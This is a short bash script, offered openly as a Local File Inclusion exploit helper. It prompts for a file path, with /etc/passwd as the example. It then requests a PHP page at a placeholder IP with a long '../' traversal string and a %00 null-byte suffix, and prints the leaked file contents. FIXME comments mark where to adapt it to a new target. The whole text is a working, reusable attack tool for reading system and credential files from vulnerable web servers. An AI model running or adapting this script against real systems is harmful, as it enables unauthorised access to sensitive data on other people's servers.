#!/bin/env bash

:<<!
auth: @cyhfvg https://github.com/cyhfvg
date: 2022/10/29

Bash-invoker example script for LFI(Local File Inclusion) exploit.
!

echo -e "input remote file.\nExample:\n>/etc/passwd\n"
echo -n ">"
while read file
do
    # FIXME: change path
    path="http://192.168.1.1/project/sub.php?param=../../../../../../../../../../../../../../../../${file}%00"
    printf "\033[32m${file}\033[0m\n";

    # FIXME: change print condition : /Container/,/h1></
    content=$(curl -s "${path}" | sed -ne '/Container/,/h1></p' | sed -e '1d;$d')

    line=$(echo "$content" | wc -l)

    # FIXME: change print range : 1,$line
    print_buff=$(echo "${content}" | sed -ne "1,$(expr $line / 2)p")
    printf "\033[33m%s\033[0m\n" "${print_buff}";

    echo -n ">"
done
